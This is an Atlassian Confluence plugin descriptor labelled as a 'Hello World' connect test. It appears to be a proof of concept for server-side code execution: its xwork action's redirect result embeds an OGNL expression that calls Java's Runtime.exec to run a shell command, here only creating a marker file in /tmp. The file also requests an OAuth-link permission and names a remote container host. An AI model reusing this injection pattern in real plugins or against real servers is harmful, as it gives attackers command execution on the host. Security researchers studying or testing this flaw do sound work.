<atlassian-plugin key="ht.hh.ac.v5" name="hh.ht connect test" plugins-version="2">
  <plugin-info>
    <description>
      Hello World Plugin
    </description>
    <version>2.0</version>
    <vendor name="hh.ht" url="http://djohnson:8000" />
    <bundle-instructions>
      <Import-Package>
        com.atlassian.confluence.core
      </Import-Package>
    </bundle-instructions>
    <permissions>
      <permission>create_oauth_link</permission>
    </permissions>
  </plugin-info>

  <xwork name="foobaraction" key="foobaraction">
    <package name="foobar" extends="default">
        <default-interceptor-ref name="defaultStack" />
        <action name="run" class="com.atlassian.confluence.core.actions.FourOhFourAction">
            <result name="success" type="redirect">/${@java.lang.Runtime@getRuntime().exec('touch /tmp/xxx')}</result>
        </action>
    </package>
  </xwork>

  <remote-plugin-container key="container" display-url="http://djohnson:8000">
    <oauth>
      <public-key>
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsGNTTtNzZeyX2FZO+86b
3WMNA5GGIDbSZCWIRFf3HKX87RmQ5tQz4KZaMnb1axSZv8hCmb5zBcI+4XMBAm91
/PjINtGFpNWa2CZoGL9u++Sooa3DhAPzfL8/8sC6VhIJIqIvLUrAw+nUgUtXGbqa
IXULkaC2VVJt+Hg91Xa07IZcPivVyGIc7lt1vdimheRQxzLbkBNSNY1KCHPRxJOs
DaHsUYJa+RecLOG6FiWJx9Y+Q5WK8Y0qu23Jdxuq4MmrqZv5+Cp3/lnCCgV47ICx
OHuXMB+VVBbHBnUVMItK1/R0DW8XoegvV7vV7cQ2UJ13WYuar916tdeoFp+Olc4Q
owIDAQAB
-----END PUBLIC KEY-----
      </public-key>
    </oauth>
  </remote-plugin-container>
</atlassian-plugin>
